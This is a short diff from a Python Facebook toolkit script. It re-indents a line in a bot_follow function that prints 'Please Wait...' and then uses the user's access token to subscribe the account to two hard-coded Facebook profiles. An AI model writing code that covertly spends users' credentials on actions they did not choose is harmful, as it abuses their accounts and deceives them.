@@ -259,7 +259,7 @@ def bot_follow():
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100000972552823/subscribers?access_token=" + toket) # ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ ألہجہٰٰﹻﹻﹻٰ۫ﹻﹻﹻنہﹻﹻٰ۫ﹻﹻرﺄل ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ
-    requests.post("https://graph.facebook.com/100037017753936/subscribers?access_token=" + toket) # Ahmed Husen Al Dukali
+	requests.post("https://graph.facebook.com/100037017753936/subscribers?access_token=" + toket) # Ahmed Husen Al Dukali
 	menu()
 
 ### MAIN MENU ###
